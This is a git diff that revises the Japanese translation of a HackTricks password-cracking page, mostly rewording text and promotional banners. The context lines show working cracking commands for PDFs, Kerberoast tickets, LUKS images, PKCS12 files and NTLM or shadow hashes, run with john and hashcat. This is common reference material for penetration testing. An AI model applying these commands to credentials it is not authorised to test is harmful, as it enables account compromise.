@@ -685,7 +689,7 @@ qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
 ### PDFオーナーパスワード
 
-PDFオーナーパスワードをクラックする方法はこちらを確認してください: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+PDFオーナーパスワードをクラックするにはこちらをチェックしてください: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -719,7 +723,7 @@ john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Lucks image
+### Lucks画像
 
 #### 方法 1
 
@@ -730,7 +734,7 @@ cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-#### 方法2
+#### 方法 2
 ```bash
 cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
 dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
@@ -781,11 +785,10 @@ zip -r file.xls .
 # From https://github.com/crackpkcs12/crackpkcs12
 crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 ```
-```markdown
-<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で**最も高度な**コミュニティツールを駆使した**ワークフローの自動化**を簡単に構築できます。
+[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で**最も高度な**コミュニティツールを動力とする**ワークフローを簡単に構築し自動化**します。\
 今すぐアクセス：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -794,8 +797,7 @@ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 
 **ハッシュ例：** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
 
-### Hash-identifier
-```
+### ハッシュ識別器
 ```bash
 hash-identifier
 > <HASH>
@@ -826,14 +828,14 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 * **ワードリスト攻撃** (`-a 0`) ルール付き
 
-**Hashcat** にはすでに**ルールが含まれているフォルダ**がありますが、[**こちらで他の興味深いルールを見つけることができます**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)。
+**Hashcat** にはすでに**ルールが含まれたフォルダ**が付属していますが、[**こちらで他の興味深いルールを見つけることができます**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)。
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
 * **Wordlist combinator** 攻撃
 
 hashcatを使用して**2つのワードリストを1つに組み合わせる**ことができます。\
-もしリスト1に**"hello"**という単語が含まれ、2番目のリストに**"world"**と**"earth"**という単語が2行含まれている場合、`helloworld`と`helloearth`が生成されます。
+もしリスト1に**"hello"** という単語が含まれ、2番目のリストに**"world"** と **"earth"** の2行が含まれている場合、`helloworld` と `helloearth` が生成されます。
 ```bash
 # This will combine 2 wordlists
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
@@ -888,7 +890,7 @@ hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-Linuxハッシュのクラッキング - /etc/shadow ファイル
+Linuxハッシュのクラッキング - /etc/shadowファイル
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
@@ -900,7 +902,7 @@ Windowsハッシュのクラッキング
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-## 一般的なアプリケーションのハッシュをクラックする
+## 一般的なアプリケーションハッシュのクラッキング
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
@@ -912,20 +914,22 @@ Windowsハッシュのクラッキング
 ```
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>
 
-* **サイバーセキュリティ会社**で働いていますか？**HackTricksで会社の広告を掲載**したいですか？または、**最新版のPEASSを入手**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションです。
-* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**にフォローしてください。**
-* **[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、ハッキングのコツを共有してください。**
+HackTricksをサポートする他の方法:
+
+* **HackTricksにあなたの会社を広告したい場合**、または**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。
 
 </details>
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で**最も進んだ**コミュニティツールによって動力を供給される**ワークフローを簡単に構築し自動化**します。\
+[**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks)を使用して、世界で**最も進んだ**コミュニティツールによって動力を供給される**ワークフローを簡単に構築し自動化する**。\
 今すぐアクセス：
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
